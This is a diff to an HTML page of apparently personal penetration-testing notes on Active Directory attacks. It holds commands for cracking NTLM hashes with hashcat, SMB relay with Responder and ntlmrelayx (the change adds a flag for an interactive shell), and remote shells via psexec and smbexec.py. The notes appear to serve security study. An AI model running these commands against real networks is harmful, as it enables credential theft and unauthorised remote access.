@@ -30,7 +30,7 @@ hashcat -m 5600 file.txt rockyou.txt --force ------  -m 5600 stands for AD hash 
 <h1>SMB Relay</h1><br>
 Instead of cracking hashes from responder, can relay hashes to another machine. SMB signing has to be disabled on the target and relayed creds must be admin on machine.<br>
 <b> to work have to go to responder.conf and turn off SMB and HTTP</b> <br>
-Run Responder.py and also now configure ntlmrelayx.py (locate ntlmrelay) python3 ntlmrelayx.py -tf targets.txt -smb2support <br>
+Run Responder.py and also now configure ntlmrelayx.py (locate ntlmrelay) python3 ntlmrelayx.py -tf targets.txt -smb2support (add -i for interactive shell)<br>
 <br>
 Can gain shell access with pw - run psexec (metasploit module) - need domain, user and pass, may need to try the module several times <br>
 Could also use - sudo python3 smbexec.py domain/username:'password'@IP <br>
